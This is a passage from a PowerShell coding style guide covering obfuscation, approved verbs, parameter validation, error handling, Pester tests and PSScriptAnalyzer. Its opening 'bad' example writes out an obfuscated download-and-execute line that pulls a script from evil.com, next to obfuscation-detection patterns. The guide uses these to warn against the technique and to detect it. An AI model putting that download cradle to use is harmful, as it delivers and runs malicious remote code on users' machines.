## Bad - Obfuscated code (red flag!)
$a='I'+'E'+'X';$b='(Ne'+'w-Ob'+'ject Ne'+'t.WebC'+'lient).Dow'+'nloadStr'+'ing';
&$a($b+"('http://evil.com/payload.ps1')")  # ❌ Malicious obfuscation!

## Good - Clear, readable code
$client = New-Object Net.WebClient
$script = $client.DownloadString('https://trusted-site.com/script.ps1')
# Verify hash before executing
$expectedHash = "ABC123..."
$stream = [IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($script))
if ((Get-FileHash -InputStream $stream).Hash -eq $expectedHash) {
    Invoke-Expression $script
}

## Good - Detect obfuscation
function Test-ScriptObfuscation {
    param([string]$ScriptPath)

    $content = Get-Content $ScriptPath -Raw

    $suspiciousPatterns = @(
        '[char]\(\d+\)',  # Char code obfuscation
        '\$\w+\s*=\s*[''"][^''"]+[''"]\s*\+',  # String concatenation obfuscation
        '-join\s*\(',  # Join obfuscation
        'iex|Invoke-Expression',  # Dynamic execution
        '\[Convert\]::FromBase64String'  # Base64 encoding
    )

    foreach ($pattern in $suspiciousPatterns) {
        if ($content -match $pattern) {
            Write-Warning "Suspicious pattern detected: $pattern"
            return $false
        }
    }
    return $true
}
```

**Key Points**:

- Never obfuscate your own scripts
- Detect and reject obfuscated scripts
- Be suspicious of base64, char codes, string concatenation
- Use PSScriptAnalyzer to detect suspicious patterns
- Review scripts before execution
- Implement application whitelisting

---

## Best Practices

### Use Approved Verbs

Always use approved PowerShell verbs from `Get-Verb`:

```powershell
# Good - Approved verbs
function Get-UserData { }
function Set-Configuration { }
function New-Deployment { }
function Remove-TempFiles { }
function Start-Service { }
function Stop-Process { }

# Bad - Unapproved verbs
function Fetch-UserData { }    # Use Get
function Delete-TempFiles { }  # Use Remove
function Create-Deployment { } # Use New
function Retrieve-Data { }     # Use Get
```

### Use CmdletBinding for Advanced Functions

Enable advanced function features with `[CmdletBinding()]`:

```powershell
# Good - Advanced function with CmdletBinding
function Get-SystemInfo {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ComputerName
    )

    Write-Verbose "Connecting to $ComputerName"  # Verbose only shown with -Verbose
    Write-Debug "Debug info"  # Debug only shown with -Debug

    # Function implementation
}

# Good - Support WhatIf and Confirm
function Remove-OldFiles {
    [CmdletBinding(SupportsShouldProcess, ConfirmImpact = 'High')]
    param(
        [string]$Path
    )

    Get-ChildItem $Path | ForEach-Object {
        if ($PSCmdlet.ShouldProcess($_.FullName, "Delete file")) {
            Remove-Item $_.FullName
        }
    }
}

# Usage
Remove-OldFiles -Path C:\Temp -WhatIf  # Shows what would be deleted
Remove-OldFiles -Path C:\Temp -Confirm  # Asks for confirmation
```

### Support Pipeline Input

Make functions pipeline-aware:

```powershell
# Good - Accept pipeline input
function Get-FileSize {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [string[]]$Path
    )

    begin {
        Write-Verbose "Starting file size calculation"
        $TotalSize = 0
    }

    process {
        foreach ($FilePath in $Path) {
            $item = Get-Item $FilePath
            $TotalSize += $item.Length
            [PSCustomObject]@{
                Path = $FilePath
                SizeKB = [math]::Round($item.Length / 1KB, 2)
            }
        }
    }

    end {
        Write-Verbose "Total size: $([math]::Round($TotalSize / 1MB, 2)) MB"
    }
}

# Usage
Get-ChildItem C:\Logs | Get-FileSize
'file1.txt', 'file2.txt' | Get-FileSize
```

### Use Parameter Validation

Validate parameters declaratively:

```powershell
# Good - Comprehensive validation
function New-UserAccount {
    [CmdletBinding()]
    param(
        # Required and not empty
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$UserName,

        # Pattern validation (email)
        [Parameter(Mandatory)]
        [ValidatePattern('^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$')]
        [string]$Email,

        # Range validation
        [ValidateRange(18, 120)]
        [int]$Age = 18,

        # Set validation
        [ValidateSet('Admin', 'User', 'Guest')]
        [string]$Role = 'User',

        # Length validation
        [ValidateLength(8, 64)]
        [string]$Password,

        # Script validation
        [ValidateScript({
            if (Test-Path $_ -PathType Container) { $true }
            else { throw "Path '$_' does not exist" }
        })]
        [string]$HomeDirectory,

        # Count validation
        [ValidateCount(1, 5)]
        [string[]]$Groups
    )

    # Function implementation
}
```

### Write Comment-Based Help

Document functions with comment-based help:

```powershell
function Get-ServiceStatus {
    <#
    .SYNOPSIS
    Retrieves the current status of Windows services.

    .DESCRIPTION
    Queries one or more Windows services and returns their current status,
    startup type, and running state. Supports filtering by service name pattern.

    .PARAMETER ServiceName
    The name or name pattern of the service(s) to query.
    Supports wildcards (* and ?).

    .PARAMETER ComputerName
    The remote computer to query. Defaults to local computer.

    .PARAMETER IncludeDependent
    Include dependent services in the output.

    .EXAMPLE
    Get-ServiceStatus -ServiceName "wuauserv"
    Gets the status of the Windows Update service.

    .EXAMPLE
    Get-ServiceStatus -ServiceName "w*" -ComputerName Server01
    Gets all services starting with 'w' on Server01.

    .EXAMPLE
    Get-ServiceStatus -ServiceName "MSSQLSERVER" -IncludeDependent
    Gets SQL Server status including dependent services.

    .INPUTS
    String. You can pipe service names to Get-ServiceStatus.

    .OUTPUTS
    PSCustomObject. Returns service status information.

    .NOTES
    Requires administrative privileges for remote computers.
    Author: Tyler Dukes
    Version: 1.0.0

    .LINK
    https://docs.microsoft.com/powershell
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, ValueFromPipeline)]
        [string[]]$ServiceName
    )

    # Implementation
}

# Access help
Get-Help Get-ServiceStatus
Get-Help Get-ServiceStatus -Examples
Get-Help Get-ServiceStatus -Detailed
```

### Use Try-Catch for Error Handling

Handle errors explicitly:

```powershell
# Good - Comprehensive error handling
function Get-RemoteData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Url,

        [int]$MaxRetries = 3
    )

    $attempt = 0
    while ($attempt -lt $MaxRetries) {
        $attempt++
        try {
            Write-Verbose "Attempt $attempt of $MaxRetries"

            $response = Invoke-RestMethod -Uri $Url -ErrorAction Stop
            Write-Verbose "Successfully retrieved data"
            return $response

        } catch [System.Net.WebException] {
            Write-Warning "Network error: $($_.Exception.Message)"
            if ($attempt -eq $MaxRetries) {
                Write-Error "Failed after $MaxRetries attempts"
                throw
            }
            Start-Sleep -Seconds (2 * $attempt)

        } catch [System.UnauthorizedAccessException] {
            Write-Error "Authentication failed: Check credentials"
            throw  # Don't retry authentication errors

        } catch {
            Write-Error "Unexpected error: $($_.Exception.Message)"
            Write-Debug $_.ScriptStackTrace
            throw

        } finally {
            Write-Verbose "Completed attempt $attempt"
        }
    }
}
```

### Use Splatting for Readability

Use hash tables for multiple parameters:

```powershell
# Good - Splatting for readability
$userParams = @{
    Name              = "John Doe"
    SamAccountName    = "jdoe"
    UserPrincipalName = "jdoe@contoso.com"
    EmailAddress      = "jdoe@contoso.com"
    Path              = "OU=Users,DC=contoso,DC=com"
    AccountPassword   = $securePassword
    Enabled           = $true
    ChangePasswordAtLogon = $false
}
New-ADUser @userParams

# Good - Combine positional and splatted parameters
$copyParams = @{
    Recurse = $true
    Force   = $true
    Verbose = $true
}
Copy-Item -Path C:\Source -Destination C:\Dest @copyParams

# Good - Modify splat based on conditions
$params = @{
    ComputerName = $server
    ScriptBlock  = { Get-Process }
}
if ($credential) {
    $params['Credential'] = $credential
}
Invoke-Command @params

# Bad - Long parameter list
New-ADUser -Name "John Doe" -SamAccountName "jdoe" `
    -UserPrincipalName "jdoe@contoso.com" -EmailAddress "jdoe@contoso.com" `
    -Path "OU=Users,DC=contoso,DC=com" -AccountPassword $securePassword `
    -Enabled $true -ChangePasswordAtLogon $false
```

### Avoid Aliases in Scripts

Use full cmdlet names for clarity:

```powershell
# Good - Full cmdlet names
Get-ChildItem -Path C:\Logs -Filter *.log |
    Where-Object { $_.Length -gt 10MB } |
    ForEach-Object { Remove-Item $_.FullName }

# Bad - Aliases reduce readability
gci C:\Logs -Filter *.log |
    ? { $_.Length -gt 10MB } |
    % { ri $_.FullName }

# Exception: Aliases OK in interactive console
# But NEVER in scripts or modules
```

### Return Objects, Not Text

Output structured objects for pipeline compatibility:

```powershell
# Good - Return objects
function Get-DiskInfo {
    [CmdletBinding()]
    param([string[]]$ComputerName = $env:COMPUTERNAME)

    foreach ($computer in $ComputerName) {
        $disk = Get-WmiObject Win32_LogicalDisk -ComputerName $computer -Filter "DriveType=3"

        foreach ($d in $disk) {
            [PSCustomObject]@{
                ComputerName = $computer
                Drive        = $d.DeviceID
                SizeGB       = [math]::Round($d.Size / 1GB, 2)
                FreeGB       = [math]::Round($d.FreeSpace / 1GB, 2)
                PercentFree  = [math]::Round(($d.FreeSpace / $d.Size) * 100, 2)
            }
        }
    }
}

# Can be used in pipeline
Get-DiskInfo -ComputerName Server01 | Where-Object { $_.PercentFree -lt 20 }
Get-DiskInfo | Export-Csv disks.csv -NoTypeInformation
Get-DiskInfo | ConvertTo-Json | Out-File disks.json

# Bad - Return text
function Get-DiskInfo {
    $disk = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3"
    Write-Host "Drive: $($disk.DeviceID)"  # Can't be piped!
    Write-Host "Free: $($disk.FreeSpace)"
}
```

### Use Write-Verbose and Write-Debug

Provide informational output without breaking pipeline:

```powershell
# Good - Use Write-Verbose for progress
function Deploy-Application {
    [CmdletBinding()]
    param(
        [string]$Source,
        [string]$Destination
    )

    Write-Verbose "Starting deployment from $Source to $Destination"

    Write-Verbose "Backing up existing files"
    Backup-Files -Path $Destination

    Write-Verbose "Copying new files"
    Copy-Item -Path $Source\* -Destination $Destination -Recurse

    Write-Debug "Deployment details: $(Get-Date)"
    Write-Verbose "Deployment completed successfully"
}

# Run with -Verbose to see progress
Deploy-Application -Source C:\App -Destination C:\Deploy -Verbose

# Bad - Using Write-Host
function Deploy-Application {
    Write-Host "Starting deployment"  # Can't be suppressed or captured
    # ...
}
```

### Type Parameters Explicitly

Always specify parameter types:

```powershell
# Good - Typed parameters
function Set-ServiceConfiguration {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ServiceName,

        [Parameter(Mandatory)]
        [ValidateSet('Running', 'Stopped')]
        [string]$DesiredState,

        [int]$TimeoutSeconds = 30,

        [switch]$Force,

        [PSCredential]$Credential
    )

    # Function implementation
}

# Bad - Untyped parameters
function Set-ServiceConfiguration {
    param(
        $ServiceName,  # No type = accepts anything
        $DesiredState,
        $TimeoutSeconds = 30
    )
}
```

### Use Proper Scoping

Manage variable scope appropriately:

```powershell
# Good - Clear scope management
$script:ConfigPath = "C:\Config"  # Script-level variable

function Get-Configuration {
    [CmdletBinding()]
    param()

    # Access script-level variable
    $config = Get-Content $script:ConfigPath | ConvertFrom-Json
    return $config  # Return value, don't use global scope
}

function Set-Configuration {
    [CmdletBinding()]
    param(
        [PSCustomObject]$Config
    )

    # Modify script-level variable
    $Config | ConvertTo-Json | Set-Content $script:ConfigPath
}

# Bad - Using global scope unnecessarily
function Get-Configuration {
    $global:config = Get-Content "C:\Config"  # Pollutes global scope
}
```

### Optimize with foreach vs ForEach-Object

Choose the right iteration method:

```powershell
# Good - foreach loop for in-memory collections (faster)
$files = Get-ChildItem C:\Logs
foreach ($file in $files) {
    Process-File $file
}

# Good - ForEach-Object for pipeline/streaming (memory efficient)
Get-ChildItem C:\Logs -Recurse | ForEach-Object {
    Process-File $_
}

# Good - Use .ForEach() method for best performance
$results = (Get-Process).ForEach({ $_.Name })

# Good - Use .Where() method instead of Where-Object
$largeFiles = (Get-ChildItem).Where({ $_.Length -gt 1MB })

# Bad - ForEach-Object for small in-memory arrays
$files = @('file1.txt', 'file2.txt', 'file3.txt')
$files | ForEach-Object {  # Slower than foreach for small arrays
    Process-File $_
}
```

### Use PSScriptAnalyzer

Lint scripts for best practices:

```powershell
# Install PSScriptAnalyzer
Install-Module -Name PSScriptAnalyzer -Scope CurrentUser

# Analyze single file
Invoke-ScriptAnalyzer -Path .\MyScript.ps1

# Analyze directory
Invoke-ScriptAnalyzer -Path .\MyModule -Recurse

# Fix issues automatically
Invoke-ScriptAnalyzer -Path .\MyScript.ps1 -Fix

# Custom settings file
Invoke-ScriptAnalyzer -Path .\MyModule -Settings .\.pslintrc.psd1

# CI/CD integration
$results = Invoke-ScriptAnalyzer -Path . -Recurse -Severity Error, Warning
if ($results) {
    $results | Format-Table -AutoSize
    throw "Script analysis failed with $($results.Count) issues"
}
```

### Use Begin-Process-End Blocks

Structure pipeline functions properly:

```powershell
# Good - Proper pipeline structure
function Measure-FileSize {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, ValueFromPipeline)]
        [System.IO.FileInfo[]]$File
    )

    begin {
        Write-Verbose "Starting file size measurement"
        $totalSize = 0
        $fileCount = 0
    }

    process {
        foreach ($f in $File) {
            $totalSize += $f.Length
            $fileCount++

            [PSCustomObject]@{
                FileName = $f.Name
                SizeMB   = [math]::Round($f.Length / 1MB, 2)
            }
        }
    }

    end {
        Write-Verbose "Processed $fileCount files"
        Write-Verbose "Total size: $([math]::Round($totalSize / 1GB, 2)) GB"
    }
}

# Usage
Get-ChildItem C:\Data -Recurse | Measure-FileSize
```

### Avoid Invoke-Expression

Never use `Invoke-Expression` with untrusted input:

```powershell
# Bad - Code injection risk
$userInput = Read-Host "Enter command"
Invoke-Expression $userInput  # DANGEROUS!

# Good - Use parameterized cmdlets
$processName = Read-Host "Enter process name"
Get-Process -Name $processName  # Safe

# Good - Use script blocks with validated input
$action = Read-Host "Choose action (start/stop)"
$scriptBlock = switch ($action) {
    'start' { { Start-Service $serviceName } }
    'stop'  { { Stop-Service $serviceName } }
    default { throw "Invalid action" }
}
& $scriptBlock  # Execute validated script block
```

### Test with Pester

Write tests for your functions:

```powershell
# Install Pester
Install-Module -Name Pester -Force -SkipPublisherCheck

# MyFunction.Tests.ps1
BeforeAll {
    . $PSScriptRoot/MyFunction.ps1
}

Describe 'Get-UserProfile' {
    Context 'Parameter validation' {
        It 'Should require UserName parameter' {
            { Get-UserProfile } | Should -Throw -ExpectedMessage '*UserName*'
        }

        It 'Should validate email format' {
            { Get-UserProfile -UserName "test" -Email "invalid" } |
                Should -Throw
        }
    }

    Context 'Functionality' {
        BeforeEach {
            Mock Get-ADUser {
                [PSCustomObject]@{
                    SamAccountName = 'testuser'
                    DisplayName    = 'Test User'
                    EmailAddress   = 'test@example.com'
                }
            }
        }

        It 'Should return user object' {
            $result = Get-UserProfile -UserName 'testuser'
            $result.UserName | Should -Be 'testuser'
        }

        It 'Should call Get-ADUser once' {
            Get-UserProfile -UserName 'testuser'
            Should -Invoke Get-ADUser -Exactly 1
        }
    }
}

# Run tests
Invoke-Pester -Path .\MyFunction.Tests.ps1
Invoke-Pester -Path .\MyFunction.Tests.ps1 -CodeCoverage .\MyFunction.ps1
```

---

## Tool Configurations

### VSCode settings.json

```json
{
    "powershell.scriptAnalysis.enable": true,
    "powershell.scriptAnalysis.settingsPath": ".pslintrc.psd1",
    "powershell.codeFormatting.preset": "OTBS",
    "powershell.codeFormatting.useCorrectCasing": true,
    "files.associations": {
        "*.ps1": "powershell",
        "*.psm1": "powershell",
        "*.psd1": "powershell"
    }
}
```

---

## References

### Official Documentation

- [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)
- [Approved Verbs](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands)
- [PowerShell Best Practices](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-development-guidelines)

### Tools

- [PSScriptAnalyzer](https://github.com/PowerShell/PSScriptAnalyzer) - Static code analyzer
- [Pester](https://pester.dev/) - Testing framework
- [Plaster](https://github.com/PowerShell/Plaster) - Template-based scaffolding
- [PSReadLine](https://github.com/PowerShell/PSReadLine) - Command-line editing

### Style Guides

- [PowerShell Practice and Style Guide](https://poshcode.gitbook.io/powershell-practice-and-style/)
- [The PowerShell Best Practices and Style Guide](https://github.com/PoshCode/PowerShellPracticeAndStyle)

---

**Status**: Active
